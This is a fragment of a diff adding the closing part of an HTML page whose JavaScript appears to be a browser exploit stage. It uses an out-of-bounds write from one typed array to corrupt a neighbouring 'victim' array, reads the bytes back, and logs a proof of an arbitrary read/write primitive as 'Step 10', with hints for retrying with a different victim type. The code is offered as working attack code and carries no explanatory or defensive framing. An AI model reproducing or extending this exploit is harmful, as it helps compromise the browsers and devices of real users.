+ if(!tgt){ B('ARW-NO-TGT','no backing above victim; widen BK'); return; }
+ var idxB=tgt.a-matched.a, idx=Number(idxB);
+ try{ tgt.o[0]=0x11; }catch(e){}
+ var ok=false; try{ matched.o[idx]=0xAB; matched.o[idx+1]=0xCD; ok=true; }catch(e){ B('ARW-WRITE-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ if(ok){ var rb0=0,rb1=0; try{ rb0=tgt.o[0]; rb1=tgt.o[1]; }catch(e){}
+   if(rb0===0xAB&&rb1===0xCD){ B('ARW-PROOF-0x'+rb0.toString(16)+rb1.toString(16)+'-at0x'+tgt.a.toString(16),'OOB write from sp['+matched.idx+'] landed in sp['+tgt.idx+'] idx0x'+idx.toString(16)); S('ARW-PROOF - base-free arbitrary R/W (Step 10)','#7a0a5a'); }
+   else{ B('ARW-MISS-0x'+rb0.toString(16)+rb1.toString(16),'expected abcd (idx0x'+idx.toString(16)+') - 2nd bound? use FastTypedArray victim'); } }
+ B('DONE','armed path complete');
+}
+</script>
+</body></html>
